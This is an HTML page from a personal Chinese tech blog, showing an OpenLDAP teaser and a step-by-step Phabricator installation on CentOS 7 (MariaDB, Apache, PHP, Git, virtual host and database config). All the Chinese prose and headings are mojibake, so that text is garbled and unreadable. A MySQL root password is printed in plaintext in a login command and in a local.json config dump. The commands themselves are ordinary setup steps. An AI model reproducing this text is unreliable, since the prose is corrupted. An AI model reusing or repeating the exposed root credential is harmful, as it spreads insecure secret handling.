<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="theme-color" content="#33474d">
	<title>Yancy&#39;s blog</title>
	<link rel="stylesheet" href="/css/style.css" />
	
      <link rel="alternate" href="/atom.xml" title="Yancy&#39;s blog" type="application/atom+xml">
    
</head>

<body>

	<header class="header">
		<nav class="header__nav">
			
				<a href="/" class="header__link">Home</a>
			
				<a href="/tags" class="header__link">Tags</a>
			
				<a href="/archives" class="header__link">ARCHIVES</a>
			
				<a href="/about/About" class="header__link">ABOUT</a>
			
				<a href="http://weibo.com/yangcvo" class="header__link">Weibo</a>
			
				<a href="/atom.xml" class="header__link">RSS</a>
			
		</nav>
		<h1 class="header__title"><a href="/">Yancy&#39;s blog</a></h1>
		<h2 class="header__subtitle">SIMPLICITY IS PREREQUISITE FOR  RELIABILITY</h2>
	</header>

	<main>
		
	<span class="different-posts different-posts_earlier">ğŸ“– <a href="/page/5">earlier posts</a> ğŸ“–</span>




	<article>
	
		<h1><a href="/2017/01/26/OpenLDAP/OpenLDAPå…¥é—¨äº†è§£å­¦ä¹ ç¬”è®°(ä¸€)/">OpenLDAPå…¥é—¨äº†è§£å­¦ä¹ ç¬”è®°(ä¸€)</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2017-01-26</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/OpenLDAP/">OpenLDAP</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/OpenLDAP/">OpenLDAP</a>
			</span>
		
	</div>

	

	
		<h2 id="OpenLDAPå…¥é—¨äº†è§£"><a href="#OpenLDAPå…¥é—¨äº†è§£" class="headerlink" title="OpenLDAPå…¥é—¨äº†è§£"></a>OpenLDAPå…¥é—¨äº†è§£</h2><h4 id="LDAPæ¦‚è¿°"><a href="#LDAPæ¦‚è¿°" class="headerlink" title="LDAPæ¦‚è¿°"></a>LDAPæ¦‚è¿°</h4><p>æˆ‘çš„ä¸ªäººç†è§£ï¼šLDAPæ˜¯è½»é‡ç›®å½•è®¿é—®åè®®(Lightweight Directory Access Protocol)çš„ç¼©å†™ï¼ŒLDAPæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„è´¦å·ç®¡ç†è®¤è¯å¹³å°ï¼Œä½¿ç”¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰æ„å»ºé›†ä¸­çš„èº«ä»½éªŒè¯ç³»ç»Ÿå¯ä»¥å‡å°‘ç®¡ç†æˆæœ¬ï¼Œå¢å¼ºå®‰å…¨æ€§ï¼Œé¿å…æ•°æ®å¤åˆ¶çš„é—®é¢˜ï¼Œå¹¶æé«˜æ•°æ®çš„ä¸€è‡´æ€§ã€‚éšç€ Linuxçš„ä¸æ–­æˆç†Ÿï¼Œå·²ç»å‡ºç°äº†å¾ˆå¤šå·¥å…·ç”¨æ¥ç®€åŒ–ç”¨æˆ·å¸å·ä¿¡æ¯åˆ° LDAPç›®å½•çš„è¿ç§»ã€‚è¿˜å¼€å‘äº†ä¸€äº›å·¥å…·ç”¨æ¥åœ¨å®¢æˆ·æœºå’Œç›®å½•æœåŠ¡å™¨ä¹‹é—´å¯ç”¨åŠ å¯†é€šä¿¡é…ç½®ï¼Œå¹¶é€šè¿‡å¤åˆ¶æä¾›å®¹é”™æ€§ã€‚æœ¬æ–‡å°†å‘æ‚¨å±•ç¤ºå¦‚ä½•é…ç½®æœåŠ¡å™¨å’Œå®¢æˆ·æœºåœ¨Centosä¸Šä½¿ç”¨OpenLDAPã€‚</p>
<p><img src="https://devopsideas.com/wp-content/uploads/2017/09/Openldap-7-800x445.jpg" alt=""></p>
		<p><a class="article__read-more-link" href="/2017/01/26/OpenLDAP/OpenLDAPå…¥é—¨äº†è§£å­¦ä¹ ç¬”è®°(ä¸€)/">...read more</a></p>
	

	

</article>




	<article>
	
		<h1><a href="/2017/01/07/è‡ªåŠ¨åŒ–+Jenkins/Phabricator/Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·/">Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2017-01-07</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/automation/">automation</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Phabricator/">Phabricator</a>
			</span>
		
	</div>

	

	
		<h2 id="Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚"><a href="#Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚" class="headerlink" title="Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚"></a>Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚</h2><p>å…¬å¸é¡¹ç›®ç®¡ç†å’Œä»£ç å®¡æŸ¥ä¸€ç›´ç”¨<code>jira</code>å’Œ<code>git</code>æ¥åš,æœ€è¿‘å‘ç°ä¸€ä¸ªä¸é”™çš„å¼€æºçš„é¡¹ç›®ç®¡ç†å¹³å° è‡ªå·±æ­å»ºä¸‹æ„Ÿè§‰è¿˜æŒºå¥½ç”¨çš„è¯å°±è½¬ç§»è¿‡æ¥äº†ã€‚</p>
<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>åœ¨Phabricatorä¸­ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„é’ˆå¯¹æ¯ä¸€æ®µä»£ç è¿›è¡Œäº¤é™…è®¨è®º;è´Ÿè´£å®¡æŸ¥çš„å·¥ç¨‹å¸ˆå¯ä»¥æ¥å—ä»£ç æ”¹å˜ï¼Œå¯ä»¥æå‡ºç–‘é—®è¦æ±‚åŸä½œè€…ç»§ç»­ä¿®æ”¹ç­‰ç­‰ã€‚</p>
<p>åœ¨Pharbricatorä¸­ï¼Œå¯ä»¥æ–°å»ºä»£ç ä»“åº“ï¼ˆä¹Ÿå°±æ˜¯åœ¨phabricatorä¸­å®¿ä¸»ä»“åº“ï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¼å…¥å¤–éƒ¨ä»“åº“ï¼ˆä»å¤–éƒ¨ä»“åº“æ‹‰å–æ•°æ®ï¼Œå¹¶è·Ÿè¸ªè¯¥å¤–éƒ¨ä»“åº“ä¿æŒæ•°æ®åŒæ­¥ï¼Œphabricatorå†…éƒ¨æœ‰ä¸€ä¸ªæ›´æ–°æœºåˆ¶ï¼‰;æ”¯æŒhttp ï¼Œä¹Ÿæ”¯æŒsshï¼ˆä¸è¿‡é…ç½®æ¯”è¾ƒéº»çƒ¦ç‚¹ï¼‰; Phabricatoræ”¯æŒä¸¤ç§ä»£ç å®¡æŸ¥å·¥ä½œæµï¼šâ€œæäº¤å‰å®¡æŸ¥â€å’Œâ€œauditâ€ï¼ˆæäº¤åå®¡æŸ¥ï¼‰ã€‚</p>
<h3 id="åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š"><a href="#åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š" class="headerlink" title="åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š"></a>åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š</h3><ul>
<li>å·®åˆ† - å®¡æŸ¥ä»£ç ï¼šç®¡ç†é¢„æ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹;</li>
<li>Maniphest - ä»»åŠ¡å’Œé”™è¯¯ï¼šç®¡ç†æˆå‘˜çš„æ‰€æœ‰ä»»åŠ¡å’ŒBugï¼Œå¯å¯¹ä»»åŠ¡æˆ–Bugå±•å¼€è®¨è®º;</li>
<li>Diffusion - ä¸»æœºå’Œæµè§ˆå­˜å‚¨åº“ï¼šç®¡ç†ä»£ç ä»“åº“ï¼Œæ”¯æŒGit / Hg / SVN;</li>
<li>å®¡è®¡ - æµè§ˆå’Œå®¡è®¡æäº¤ï¼šç®¡ç†åæ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹;</li>
<li>Phriction - Wikiï¼šæ–‡æ¡£ç®¡ç†;</li>
<li>é¡¹ç›® - ç»„ç»‡ï¼šå·¥ç¨‹ç®¡ç†ï¼Œå¯å…³è”èµ„æºåº“;</li>
<li>æºä»£ç æ‰˜ç®¡åœ¨<a href="https://github.com/phacility/phabricator" target="_blank" rel="external">Github</a></li>
</ul>
<h3 id="ç‰¹æ€§ï¼š"><a href="#ç‰¹æ€§ï¼š" class="headerlink" title="ç‰¹æ€§ï¼š"></a>ç‰¹æ€§ï¼š</h3><p>ä»£ç å®¡æŸ¥ï¼ˆCode Reviewï¼‰<br>gitä»“åº“<br>è·Ÿè¸ªbug<br>é¡¹ç›®ç®¡ç†<br>å›¢é˜Ÿæ²Ÿé€š</p>
<p>å…³äºphabricatoræ›´å¤šçš„ä»‹ç»ï¼Œè®¿é—®é¡¹ç›®å®˜ç½‘ï¼š<a href="httpsï¼š//secure.phabricator.com/book/phabricator/article/introduction/">phabricator</a></p>
<h3 id="ç¯å¢ƒè¦æ±‚ï¼š"><a href="#ç¯å¢ƒè¦æ±‚ï¼š" class="headerlink" title="ç¯å¢ƒè¦æ±‚ï¼š"></a>ç¯å¢ƒè¦æ±‚ï¼š</h3><p>Phabricatoræ˜¯ä¸€ä¸ªLAMPåº”ç”¨å¥—ä»¶ï¼Œå› æ­¤æœ€åŸºæœ¬çš„è¦æ±‚å°±æ˜¯LAMPç¯å¢ƒï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">* Linuxç³»ç»Ÿç¯å¢ƒï¼šcentos7.1 64ä½</div><div class="line">* Apacheï¼ˆæˆ–nginxï¼Œæˆ–lighttpdï¼‰ï¼šéœ€è¦Apache 2.2.7ä»¥ä¸Šç‰ˆæœ¬ã€‚</div><div class="line">* MySQLï¼šMySQLå¿…éœ€</div><div class="line">* PHPï¼šéœ€è¦PHP5.2ä»¥ä¸Šç‰ˆæœ¬</div><div class="line"></div><div class="line">è¿™é‡Œæˆ‘å®‰è£…ç‰ˆæœ¬ï¼š</div><div class="line">* Apache 2.2.15</div><div class="line">* mysql 5.6.29</div><div class="line">* php 5.4.16</div></pre></td></tr></table></figure>
<h3 id="phabricatorå®‰è£…"><a href="#phabricatorå®‰è£…" class="headerlink" title="phabricatorå®‰è£…"></a>phabricatorå®‰è£…</h3><p>å‚è€ƒï¼š<a href="https : //secure.phabricator.com/book/phabricator/article/installation_guide/">å®˜ç½‘phabricatorå®‰è£…</a></p>
<p>å…·ä½“è¿‡ç¨‹ä¸æè¿°ï¼Œä»¥æˆ‘å‚è€ƒçš„ç½‘ç»œèµ„æºè¿›è¡Œè¯´æ˜ã€‚ç½‘ä¸Šçš„èµ„æºå‚è€ƒäº†ç‰¹åˆ«å¤šï¼Œåªæ”¾æˆ‘è®¤ä¸ºæœ€æœ‰å¸®åŠ©çš„ã€‚</p>
<p>é¦–å…ˆï¼Œ<code>phabricator</code>æ˜¯åŸºäºphpçš„ï¼ŒåŒæ—¶éœ€è¦å‘é€é‚®ä»¶ï¼ˆæé†’ä»£ç å®¡æŸ¥è€…ï¼‰ï¼Œæ‰€ä»¥å‡å®šæœåŠ¡å™¨ä¸Šå·²ç»é…ç½®å¥½äº†<code>phpï¼Œmysqlï¼Œnginxï¼Œpostfix</code>ç­‰ç¯å¢ƒ;åŒæ—¶ï¼Œå®˜æ–¹æ¨èå¼€å¯APCæ€§èƒ½.</p>
<p>###1 å®‰è£…MariaDBæ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install mariadb mariadb-server</div></pre></td></tr></table></figure>
<p>å¯åŠ¨MariadbæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl start mariadb</div><div class="line">systemctl <span class="built_in">enable</span> mariadb</div></pre></td></tr></table></figure>
<p>è¿è¡ŒMySQLåˆå§‹åŒ–å®‰è£…è„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_secure_installation</div></pre></td></tr></table></figure>
<p>é»˜è®¤å¯†ç ä¸ºç©ºã€‚</p>
<p>è¿™é‡Œéœ€è¦é…ç½®ä¼˜åŒ–my.cnf å¦‚æœé»˜è®¤ä¸ä¼˜åŒ–ä¹Ÿæ˜¯å¯ä»¥çš„ä¸è¿‡å®‰è£…å®Œæˆä»¥åå¯ä»¥çœ‹åˆ°æˆ‘ä¸‹é¢æ–‡ç« ä¼šå‡ºç°10å¤šä¸ªé—®é¢˜ å¤§éƒ¨åˆ†éƒ½æ˜¯è·ŸMySQLç›¸å…³çš„ã€‚</p>
<h5 id="é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š"><a href="#é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š" class="headerlink" title="é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š"></a>é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vim /etc/my.cnf</div><div class="line">[mysqld]</div><div class="line">innodb_buffer_pool_size = 1600M</div><div class="line">max_allowed_packet = <span class="string">"33554432"</span></div><div class="line">sql_mode=STRICT_ALL_TABLES</div><div class="line">ft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txt</div><div class="line">ft_min_word_len = 3</div></pre></td></tr></table></figure>
<h5 id="éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š"><a href="#éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š" class="headerlink" title="éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š"></a>éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@Phabricator sql]<span class="comment"># mysql -uroot -pqwde1dsdfg3.com</span></div><div class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</div><div class="line">Your MariaDB connection id is 75</div><div class="line">Server version: 5.5.52-MariaDB MariaDB Server</div><div class="line"></div><div class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</div><div class="line"></div><div class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> help. Type <span class="string">'\c'</span> to clear the current input statement.</div><div class="line"></div><div class="line">MariaDB [(none)]&gt; REPAIR TABLE phabricator_search.search_documentfield;</div><div class="line">+-----------------------------------------+--------+----------+----------+</div><div class="line">| Table                                   | Op     | Msg_type | Msg_text |</div><div class="line">+-----------------------------------------+--------+----------+----------+</div><div class="line">| phabricator_search.search_documentfield | repair | status   | OK       |</div><div class="line">+-----------------------------------------+--------+----------+----------+</div><div class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div></pre></td></tr></table></figure>
<ul>
<li>mysql 5.6å®‰è£…ï¼Œä¸è¿‡è¿™é‡Œæˆ‘æœ€åå¯ç”¨çš„æ˜¯5.6ç‰ˆæœ¬ï¼ŒåŸå› å·²ç»è¯´æ˜äº†.</li>
</ul>
<h3 id="2-å®‰è£…Apache"><a href="#2-å®‰è£…Apache" class="headerlink" title="2 å®‰è£…Apache"></a>2 å®‰è£…Apache</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ï¼ƒyum -y install httpd</div></pre></td></tr></table></figure>
<p>é…ç½®Apacheï¼Œæé«˜ä¸€ç‚¹å®‰å…¨æ€§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sed -i <span class="string">'s/^/#&amp;/g'</span> /etc/httpd/conf.d/welcome.conf  <span class="comment"># æ³¨é‡Šæ‰æ¯ä¸€è¡Œ</span></div><div class="line">sed -i <span class="string">"s/Options Indexes FollowSymLinks/Options FollowSymLinks/"</span> /etc/httpd/conf/httpd.conf</div></pre></td></tr></table></figure>
<p>å¯åŠ¨Apache webæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl start httpd</div><div class="line">systemctl <span class="built_in">enable</span> httpd</div></pre></td></tr></table></figure>
<h3 id="3-å®‰è£…PHPå’Œä¸€äº›æ¨¡å—"><a href="#3-å®‰è£…PHPå’Œä¸€äº›æ¨¡å—" class="headerlink" title="3 å®‰è£…PHPå’Œä¸€äº›æ¨¡å—"></a>3 å®‰è£…PHPå’Œä¸€äº›æ¨¡å—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process</div></pre></td></tr></table></figure>
<p>é…ç½®ä¼˜åŒ– ä¸ç„¶å®‰è£…æˆåŠŸä»¥åä¼šå‡ºç°é—®é¢˜é”™è¯¯æç°âŒï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1. æœªé…ç½®æœåŠ¡å™¨æ—¶åŒº  </div><div class="line"></div><div class="line">[root@Phabricator sql]<span class="comment"># vim /etc/php.ini</span></div><div class="line">ä¾‹ </div><div class="line">;date.timezone = </div><div class="line">æ”¹æˆ: </div><div class="line">date.timezone = Asia/Shanghai </div><div class="line"> </div><div class="line">PHP post_max_sizeæœªé…ç½® </div><div class="line">å°†PHP é…ç½®ä¸­çš„post_max_size è°ƒæ•´ä¸ºè‡³å°‘32MBã€‚è®¾ç½®ä¸ºè¾ƒå°å€¼æ—¶ï¼Œå¤§æ–‡ä»¶ä¸Šä¼ å¯èƒ½æ— æ³•æ­£å¸¸å·¥ä½œã€‚</div><div class="line">post_max_size = 32M</div></pre></td></tr></table></figure>
<ul>
<li>php5.4ç‰ˆæœ¬å¯ä»¥ç›´æ¥ä½¿ç”¨<a href="https://secure.phabricator.com/diffusion/P/browse/master/scripts/install/install_rhel-derivs.sh" target="_blank" rel="external">phabricator.sh</a>æä¾›çš„è„šæœ¬å®‰è£…ï¼Œè¿™ä¸ªè„šæœ¬ä¼šæ£€æŸ¥<code>phabricator</code>éœ€è¦çš„ç¯å¢ƒï¼Œæ²¡æœ‰çš„ä¼šè‡ªåŠ¨å®‰è£…ï¼Œä¹‹åä¼šå®‰è£…å¥½phabricatorï¼Œå®‰è£…å‚è€ƒ<a href="https://my.oschina.net/yoyoko/blog/126325" target="_blank" rel="external">phabricator</a>å®‰è£…å‘å¯¼.</li>
</ul>
<h3 id="4-å®‰è£…Git"><a href="#4-å®‰è£…Git" class="headerlink" title="4 å®‰è£…Git"></a>4 å®‰è£…Git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install git</div></pre></td></tr></table></figure>
<p>å¯å‚è€ƒç½‘ä¸Šé˜²ç«å¢™å’Œselinuxå»ºè®®æ ¹æ®æ­¤æ–‡ç« é…ç½®ä¸€ä¸‹.</p>
<p>å¦‚æœä½ å·²ç»è®¾ç½®å¥½LAMPç¯å¢ƒï¼Œä½ å¯ä»¥å·²ç»è·å¾—ä½ æ‰€éœ€çš„ä»»ä½•ä¸œä¸œã€‚å¦‚ä½•å®‰è£…LAMPå¯ä»¥æŸ¥çœ‹æˆ‘å†™<a href="http://blog.yangcvo.me/2014/12/07/Linux%E7%AC%94%E8%AE%B0/LAMP/yum%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BDLAMP%E7%8E%AF%E5%A2%83/" target="_blank" rel="external">yumä¸€é”®å®‰è£…ä¸å¸è½½LAMPç¯å¢ƒ</a></p>
<h3 id="5-ä¸‹è½½å®‰è£…Phabricator"><a href="#5-ä¸‹è½½å®‰è£…Phabricator" class="headerlink" title="5 ä¸‹è½½å®‰è£…Phabricator"></a>5 ä¸‹è½½å®‰è£…Phabricator</h3><p>æ—¢ç„¶ä½ å·²ç»å®‰è£…ä»¥ä¸Šæ‰€éœ€çš„ä¾èµ–ç¯å¢ƒæœåŠ¡ï¼Œä¸‹é¢è·å–Phabricatorä»¥åŠå…¶ä¾èµ–åŒ…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /var/www/html/</div><div class="line"><span class="built_in">cd</span> /var/www/html/</div><div class="line">git <span class="built_in">clone</span> https://github.com/phacility/libphutil.git</div><div class="line">git <span class="built_in">clone</span> https://github.com/phacility/arcanist.git</div><div class="line">git <span class="built_in">clone</span> https://github.com/phacility/phabricator.git</div><div class="line">chown -R apache: /var/www/html/*</div></pre></td></tr></table></figure>
<h3 id="6-åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶"><a href="#6-åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶" class="headerlink" title="6 åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶"></a>6 åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/httpd/conf.d/phabricator.conf</div></pre></td></tr></table></figure>
<p>å†™å…¥å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerAdmin phabricator.ihaozhuo.com</div><div class="line">    DocumentRoot /var/www/html/phabricator/webroot/</div><div class="line">    ServerName phabricator.ihaozhuo.com</div><div class="line">    ServerAlias phabricator.ihaozhuo.com</div><div class="line">    RewriteEngine on</div><div class="line">    RewriteRule ^/rsrc/(.*)     -                       [L,QSA]</div><div class="line">    RewriteRule ^/favicon.ico   -                       [L,QSA]</div><div class="line">    RewriteRule ^(.*)$          /index.php?__path__=<span class="variable">$1</span>  [B,L,QSA]</div><div class="line">    &lt;Directory /var/www/html/phabricator/webroot/&gt;</div><div class="line">        AllowOverride All</div><div class="line">    &lt;/Directory&gt;</div><div class="line">    ErrorLog /var/<span class="built_in">log</span>/httpd/phabricator.ihaozhuo.com-error_log</div><div class="line">    CustomLog /var/<span class="built_in">log</span>/httpd/phabricator.ihaozhuo.com-access_log common</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>
<p>â—ï¸â—ï¸æ³¨æ„æ›¿æ¢ä¸Šé¢çš„åŸŸåã€‚<br>å…¶ä¸­<code>/var/www/html/phabricator/webroot</code>æ˜¯æˆ‘çš„<code>phabricator</code>å®‰è£…è·¯å¾„ï¼Œå¤§å®¶ä½¿ç”¨æ—¶å€™æ¢æˆè‡ªå·±çš„å³å¯ã€‚<br>å®‰è£…å¥½phabricatorä¹‹åï¼Œéœ€è¦ä½¿ç”¨phabricatorå®‰è£…ç›®å½•ä¸‹binæ–‡ä»¶å¤¹ä¸‹çš„å‘½ä»¤æ¥æ›´æ–°ä¸‹.</p>
<h3 id="é‡å¯apacheæœåŠ¡ï¼š"><a href="#é‡å¯apacheæœåŠ¡ï¼š" class="headerlink" title="é‡å¯apacheæœåŠ¡ï¼š"></a>é‡å¯apacheæœåŠ¡ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart httpd</div></pre></td></tr></table></figure>
<h3 id="7-è®¾ç½®MariaDBæ•°æ®åº“"><a href="#7-è®¾ç½®MariaDBæ•°æ®åº“" class="headerlink" title="7 è®¾ç½®MariaDBæ•°æ®åº“"></a>7 è®¾ç½®MariaDBæ•°æ®åº“</h3><p>é…ç½®Phabricatorè¿æ¥MariaDBéœ€è¦çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> <span class="string">/var/www/html/phabricator/</span></div><div class="line"><span class="string">./bin/config</span> <span class="keyword">set</span> mysql.host localhost  </div><div class="line"><span class="string">./bin/config</span> <span class="keyword">set</span> mysql.port 3306</div><div class="line"><span class="string">./bin/config</span> <span class="keyword">set</span> mysql.user root</div><div class="line"><span class="string">./bin/config</span> <span class="keyword">set</span> mysql.pass &lt;your-MySQL-root-password&gt;</div></pre></td></tr></table></figure>
<h3 id="åˆ›å»ºæ•°æ®åº“ï¼š"><a href="#åˆ›å»ºæ•°æ®åº“ï¼š" class="headerlink" title="åˆ›å»ºæ•°æ®åº“ï¼š"></a>åˆ›å»ºæ•°æ®åº“ï¼š</h3><p>å‡ºç°é—®é¢˜ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[root@phabricator bin]<span class="comment"># ./storage upgrade</span></div><div class="line">MySQL Credentials Not Configured</div><div class="line"></div><div class="line">Unable to connect to MySQL using the configured credentials. You must</div><div class="line">configure standard credentials before you can upgrade storage. Run these</div><div class="line">commands to <span class="built_in">set</span> up credentials:</div><div class="line"></div><div class="line">  phabricator/ $ ./bin/config <span class="built_in">set</span> mysql.host __host__</div><div class="line">  phabricator/ $ ./bin/config <span class="built_in">set</span> mysql.user __username__</div><div class="line">  phabricator/ $ ./bin/config <span class="built_in">set</span> mysql.pass __password__</div><div class="line"></div><div class="line">These standard credentials are separate from any administrative credentials</div><div class="line">provided to this <span class="built_in">command</span> with __--user__ or __--password__, and must be</div><div class="line">configured correctly before you can proceed.</div><div class="line"></div><div class="line">Raw MySQL Error: Attempt to connect to root@localhost failed with error</div><div class="line"><span class="comment">#2002: Can't connect to local MySQL server through socket</span></div><div class="line"><span class="string">'/var/lib/mysql/mysql.sock'</span> (2).</div></pre></td></tr></table></figure>
<p>å‡ºç°è¿™ä¸€æ­¥é—®é¢˜ å°±æ˜¯å› ä¸ºæ²¡æœ‰é…ç½®å¥½MySQLçš„è¿æ¥åœ°å€ä¿¡æ¯ã€‚é…ç½®ä¸‹mysqlçš„userå’Œpasså°±è¡Œã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@Phabricator <span class="built_in">local</span>]<span class="comment">#  cat /var/www/html/phabricator/conf/local/local.json</span></div><div class="line">&#123;</div><div class="line">  <span class="string">"mysql.pass"</span>: <span class="string">"qwde1dsdfg3.com"</span>,</div><div class="line">  <span class="string">"mysql.user"</span>: <span class="string">"root"</span>,</div><div class="line">  <span class="string">"mysql.port"</span>: <span class="string">"3306"</span>,</div><div class="line">  <span class="string">"mysql.host"</span>: <span class="string">"localhost"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
